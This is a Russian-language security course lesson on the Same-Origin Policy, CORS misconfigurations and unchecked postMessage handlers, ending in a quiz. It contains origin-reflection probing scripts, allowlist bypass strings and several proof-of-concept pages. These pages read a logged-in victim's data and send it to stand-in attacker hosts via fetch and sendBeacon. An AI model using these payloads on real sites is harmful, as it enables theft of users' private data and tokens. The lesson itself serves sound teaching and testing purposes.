---
id: web-same-origin-cors
title: "Same-Origin Policy, CORS и postMessage"
category: web
parent: web-http-basics
difficulty: easy
order: 4
tags: [cors, same-origin, sop, postmessage, acao, misconfig]
prerequisites: [web-http-basics]
useful_for:
  - "CTF Web категория"
  - "Bug bounty"
estimated_minutes: 45
summary: "Почему браузер не даёт читать чужой домен, как CORS это разрешает и какие конфигурации открывают доступ злоумышленнику."
---

Браузер — это среда, где ваш JS с одного сайта не должен читать данные другого сайта. За это отвечает **Same-Origin Policy (SOP)**. А когда сайтам нужно легально общаться между доменами, включают **CORS**. Ошибки в CORS-конфигурации — один из самых частых багов в API, потому что «разрешить всё» выглядит удобно, а на деле отдаёт данные атакующему.

## Теория: что такое Origin

**Origin (источник)** = схема + хост + порт. Всё три вместе.

| URL | Origin |
|-----|--------|
| `https://a.com/x` | `https://a.com` |
| `https://a.com:8443/x` | `https://a.com:8443` |
| `http://a.com` | `http://a.com` (другая схема!) |
| `https://sub.a.com` | `https://sub.a.com` (другой хост!) |

`https://a.com` и `http://a.com` — **разные** origin. `a.com` и `b.a.com` — тоже разные.

**SOP** означает: JS со страницы `https://evil.com` не может прочитать ответ `fetch('https://bank.com/api/me')`. Важно: SOP **не запрещает отправить** запрос (это делает CSRF, см. `web-csrf`), он запрещает **прочитать ответ** и делиться им.

## Теория: как работает CORS

Когда JS делает кросс-доменный запрос, браузер добавляет заголовок `Origin: https://evil.com`. Сервер может ответить:

```
Access-Control-Allow-Origin: https://evil.com
Access-Control-Allow-Credentials: true
```

`Access-Control-Allow-Origin` (ACAO) говорит браузеру: «ответ этому origin читать можно». Если значение не совпадает с Origin или заголовка нет — браузер отдаёт JS ошибку и «прячет» тело.

Для «сложных» запросов (нестандартные методы, `Content-Type: application/json`, кастомные заголовки) браузер сначала шлёт **preflight** — `OPTIONS` с заголовками `Access-Control-Request-Method` и `Access-Control-Request-Headers`. Сервер должен ответить `Access-Control-Allow-Methods`/`-Headers`.

Ключевые опасные конфигурации:

1. `Access-Control-Allow-Origin: *` вместе с `Access-Control-Allow-Credentials: true` — **невалидно по спеке** (браузер отклонит), поэтому атакующие ищут отражение.
2. **Отражение Origin без валидации:** сервер берёт `Origin` и возвращает его же в ACAO. Любой сайт получает доступ.
3. **Слабая проверка суффикса/префикса:** `if (origin.endsWith('example.com'))` — обходится доменом `example.com.evil.com` или `evilexample.com`.
4. **Доверие `null`:** если ACAO возвращает `null` (для sandbox-iframe, `data:`), атакующий получает доступ из sandbox-страницы.
5. **Чрезмерный whitelist:** внутренние/дев-домены (`http://localhost`, `*.dev.example.com`) в списке — XSS/поддомен-тейковер открывает доступ.

## Теория: postMessage

Межоконное/межфреймовое общение идёт через `window.postMessage`. Ошибка — **отсутствие проверки `event.origin`**:

```js
// УЯЗВИМО: принимает сообщение из любого окна
window.addEventListener('message', (e) => {
  document.getElementById('token').innerHTML = e.data;
});
```

Атакующий открывает сайт во фрейме и шлёт `postMessage` с произвольными данными → DOM-XSS или утечка. Также опасен `targetOrigin: '*'` при отправке секретов.

## Инструменты: curl и Burp

Проверить preflight вручную:

```bash
curl -s -i -X OPTIONS https://api.target.local/user/me \
  -H 'Origin: https://evil.com' \
  -H 'Access-Control-Request-Method: GET' \
  -H 'Access-Control-Request-Headers: authorization'
```

Смотрим на `Access-Control-Allow-Origin`, `Access-Control-Allow-Credentials`, `Access-Control-Allow-Methods`.

Проверить «настоящий» запрос:

```bash
curl -s -i https://api.target.local/user/me \
  -H 'Origin: https://evil.com' \
  -b 'session=...'
```

Быстрый скрипт перебора origin-вариантов (запускается вручную, не циклом по чужим данным):

```bash
for o in https://evil.com https://target.local.evil.com https://eviltarget.local \
         null http://localhost http://127.0.0.1; do
  acao=$(curl -s -I "https://api.target.local/x" -H "Origin: $o" \
        | grep -i '^access-control-allow-origin' | tr -d '\r')
  echo "$o -> $acao"
done
```

В **Burp** удобно расширение **CORS* / CORS Misconfiguration** или ручной Repeater: меняете `Origin` и смотрите на ответ.

## Разобранный пример: отражение Origin → кража данных

Шаг 1. Проверяем произвольный origin:

```bash
curl -s -i 'https://api.target.local/api/me' -H 'Origin: https://evil.com' -b 'session=victim'
```

Ответ:

```
Access-Control-Allow-Origin: https://evil.com
Access-Control-Allow-Credentials: true
```

Это значит: сервер отражает любой Origin и разрешает credentials. Классический критичный CORS-баг.

Шаг 2. Проверяем, что данные реально читаются. На странице `https://evil.com`:

```html
<script>
fetch('https://api.target.local/api/me', {credentials:'include'})
  .then(r => r.text())
  .then(d => fetch('https://attacker.example/log?d=' + encodeURIComponent(d)));
</script>
```

Жертва открывает `evil.com` (будучи залогинена на target), и её данные утекают на сервер атакующего. Это **High/Critical**: чтение приватных данных через браузер жертвы.

Шаг 3. Убедиться, что это не false positive: повторить с `Origin: https://evil2.com` — если снова отражается, валидации нет.

## Разобранный пример: bypass проверки суффиксом

Если код проверяет `origin.endsWith('target.local')`:

```bash
curl -s -I 'https://api.target.local/api/me' -H 'Origin: https://attacker-target.local' -b 'session=victim'
# Access-Control-Allow-Origin: https://attacker-target.local
```

Домен `attacker-target.local` (которым вы владеете) проходит проверку `endsWith`, и вы читаете данные. Аналогично `target.local.evil.com` при проверке `startsWith`.

## Частые ошибки

- **Путать CORS с защитой от CSRF.** CORS разрешает/запрещает чтение ответа, но не мешает выполнить действие. CSRF — отдельный класс.
- **Верить `ACAO: *` без credentials.** Если `Allow-Credentials` не `true`, cookie жертвы не уйдут, и баг менее критичен (но публичные API всё равно могут утечь).
- **Игнорировать preflight.** Проверять надо и `OPTIONS`, и сам запрос — иногда правила различаются.
- **Не проверять `null` и поддомены.** Самая частая «дыра» — доверие `null` или dev-домену.
- **Забывать про postMessage.** Даже при идеальном CORS `addEventListener('message')` без проверки origin ломает изоляцию.
- **Ломать прод тестами.** Меняйте только заголовок `Origin`; не шлите разрушительные методы.

## Полный разбор: CORS с credentials и кража данных (с выводом)

Мисконфиг CORS опасен, когда сервер отражает `Origin` и включает `Access-Control-Allow-Credentials: true`. Тогда скрипт с чужого домена читает приватные данные жертвы.

Шаг 1. Проверяем отражение Origin:

```bash
curl -s -I https://api.example/me -H 'Origin: https://evil.com' | grep -i access-control
# Access-Control-Allow-Origin: https://evil.com
# Access-Control-Allow-Credentials: true
# -> критично
```

Шаг 2. Строим PoC-страницу на своём домене:

```html
<script>
fetch('https://api.example/me', {credentials:'include'})
  .then(r => r.text())
  .then(d => fetch('https://attacker/collect?d='+encodeURIComponent(d)));
</script>
```

Шаг 3. Жертва открывает страницу → браузер шлёт cookie на `api.example`, читает ответ (потому что Origin разрешён) и эксфильтрует его на наш сервер:

```
GET /collect?d=%7B%22user%22%3A%22admin%22%2C%22token%22%3A%22eyJ...%22%7D
```

Если `Allow-Credentials` не стоит, но эндпоинт отдаёт данные без cookie (например, по API-ключу в URL) — кража тоже возможна, но нужен предсказуемый/утекший ключ.

## postMessage: обработчики и утечки

`window.postMessage` без проверки `event.origin` — классическая утечка. Ищем:

```javascript
window.addEventListener('message', e => {
  // нет проверки e.origin -> любой iframe/окно может прислать сообщение
  document.getElementById('token').value = e.data;
});
```

Или обработчик, который **отвечает** любому источнику:

```javascript
window.addEventListener('message', e => {
  e.source.postMessage(location.href, '*');   // утечка URL (в т.ч. с токеном)
});
```

PoC — открыть цель в iframe и послать сообщение:

```html
<iframe id=f src="https://app.example/widget"></iframe>
<script>
f.onload = () => {
  f.contentWindow.postMessage('getToken','*');
  window.addEventListener('message', e => navigator.sendBeacon('https://attacker/c', e.data));
};
</script>
```

Проверка: смотрим в DevTools → Sources → ищем `addEventListener('message'`. Уязвимо, если нет `if (e.origin !== 'https://expected') return;`.

## Reference-таблица: заголовки CORS и их значение

| Заголовок | Значение | Риск |
|-----------|----------|------|
| `Access-Control-Allow-Origin: *` | любой origin | нельзя с credentials, но публичная утечка данных |
| `ACAO: <reflected Origin>` | эхо Origin | критично вместе с credentials |
| `Access-Control-Allow-Credentials: true` | разрешены cookie | усиливает любой ACAO |
| `Access-Control-Allow-Methods` | методы | расширяет поверхность (PUT/DELETE) |
| `Access-Control-Allow-Headers` | заголовки | доступ к кастомным заголовкам |
| `Access-Control-Expose-Headers` | видимые заголовки | утечка токенов в заголовках |
| `Access-Control-Max-Age` | кеш preflight | снижает защиту при смене политики |
| `Vary: Origin` | корректное кеширование | без него кеш отдаёт чужой ACAO |

## Обход allowlist: суффиксы, null-origin, поддомены

Разработчики часто «проверяют» домен нестрого:

- **Суффикс:** `if (origin.endsWith('example.com'))` → `https://evil-example.com` и `https://example.com.evil.com` проходят.
- **Префикс:** `startsWith('https://example.com')` → `https://example.com.evil.com` проходит.
- **Регистр/схема:** `HTTPS://EXAMPLE.COM`, `http://example.com` (если проверка строгая по `https`).
- **null-origin:** `Origin: null` (sandboxed iframe, `data:`, `file:`) — многие allowlist'ы пропускают `null`.
- **Поддомен:** `https://sub.example.com` при allowlist на apex.
- **`@`-трюк:** `https://example.com@evil.com` — если парсится наивно.
- **Порты:** `https://example.com:evil` / нестандартный порт.
- **Спецсимволы:** `https://example.com%60.evil.com`, `https://example.com%2f@evil.com`.

Проверяем все варианты, подставляя `Origin` и глядя на отражённый `ACAO`:

```bash
for o in 'https://evil-example.com' 'https://example.com.evil.com' 'null' 'http://example.com'; do
  echo -n "$o -> "
  curl -s -I https://api.example/me -H "Origin: $o" | grep -i 'access-control-allow-origin'
done
```

## Что делать дальше / решение

1. **Найти CORS-эндпоинты** (API, `/me`, `/api/*`) — обычно с credentials.
2. **Проверить отражение** `Origin` + `Allow-Credentials`.
3. **Перебрать обходы allowlist** (суффикс/префикс/null/поддомен).
4. **Собрать PoC** с `credentials:'include'` и эксфильтрацией на свой хост.
5. **Проверить postMessage** — обработчики без проверки `origin` и те, что отвечают `'*'`.
6. **Учесть кеш:** без `Vary: Origin` кешированный ответ с чужим ACAO может отравлять других клиентов.

## SOP: что реально защищает

Same-Origin Policy — базовый барьер: скрипт с `https://evil.com` не может прочитать ответ `https://api.example` без явного разрешения CORS. Origin = схема + хост + порт; смена любого компонента делает origin другим.

Важные детали, которые ломают наивные ожидания:

- **`document.domain`:** старый способ ослабить SOP между поддоменами; если цель его выставляет, `a.example.com` и `b.example.com` читают друг друга.
- **`window.open` / iframe:** получить доступ к `contentWindow` чужого origin нельзя, но можно *писать* в `location` (кликджекинг, navigation-based leak).
- **Куки:** `SameSite=Lax`/`Strict` ограничивают отправку в кросс-сайтовых запросах — это не SOP, а защита от CSRF; проверяйте атрибут отдельно.
- **`crossOriginIsolated`:** если страница не изолирована, `SharedArrayBuffer` недоступен — влияет на тайминговые атаки.

Понимание SOP нужно, чтобы отличать настоящий CORS-мисконфиг от ложного срабатывания: отражение `Origin` без credentials не даёт читать аутентифицированные данные, а `*` и `credentials:true` вместе запрещены спецификацией — браузер отклонит такой ответ.

## Квиз

Выберите один вариант в каждом вопросе.

```quiz
- question: "Что такое Origin?"
  options:
    - "Схема + хост + порт"
    - "Только хост"
    - "IP-адрес сервера"
    - "Значение заголовка `Host`"
  answer: 0
  explanation: "Origin включает схему, хост и порт; `https://a.com` и `http://a.com` — разные."
- question: "Какую комбинацию CORS-заголовков браузер отклонит как невалидную?"
  options:
    - "`ACAO: https://a.com` + `ACAC: true`"
    - "`ACAO: *` + `ACAC: true`"
    - "`ACAO: *` без `ACAC`"
    - "`ACAO: null`"
  answer: 1
  explanation: "Спека запрещает `*` вместе с `Access-Control-Allow-Credentials: true`."
- question: "Чем опасен ответ `Access-Control-Allow-Origin: null`?"
  options:
    - "Он ничего не значит"
    - "Позволяет читать данные из sandbox-iframe и `data:`-страниц"
    - "Отключает HTTPS"
    - "Включает preflight"
  answer: 1
  explanation: "Origin `null` можно получить из sandbox/data-контекстов, которыми управляет атакующий."
- question: "Проверку `origin.endsWith("example.com")` обходит домен, который атакующий может зарегистрировать сам:"
  options:
    - "`example.com.attacker.net`"
    - "`attackerexample.com`"
    - "`attacker.net`"
    - "`sub.attacker.net`"
  answer: 1
  explanation: "Строка `attackerexample.com` заканчивается на `example.com`, поэтому проверка `endsWith` её пропускает. Поэтому суффиксную проверку надо делать по границе домена (`endsWith('.example.com')` или точное сравнение)."
- question: "Какую проверку обязательно должен делать обработчик `message`?"
  options:
    - "Проверять `event.data` на длину"
    - "Проверять `event.origin` по белому списку"
    - "Проверять `document.domain`"
    - "Проверять `Referer` в JS"
  answer: 1
  explanation: "Без проверки `event.origin` любой сайт может слать сообщения в ваш обработчик."
```

## Где пригодится

- **CTF (Web):** CORS-мисконфиг и postMessage-XSS — популярные задания, где флаг отдаётся только «правильному» origin.
- **Bug bounty:** отражение Origin с credentials — высокооплачиваемый баг; проверяется за минуты через curl.
- **Пентест:** анализ CORS входит в проверку API и одностраничных приложений (SPA), где весь трафик идёт на отдельный API-домен.
- **Работа (AppSec/Dev):** настройка CORS — частая причина утечек; умение выставить точечный whitelist вместо `*` — базовый навык.
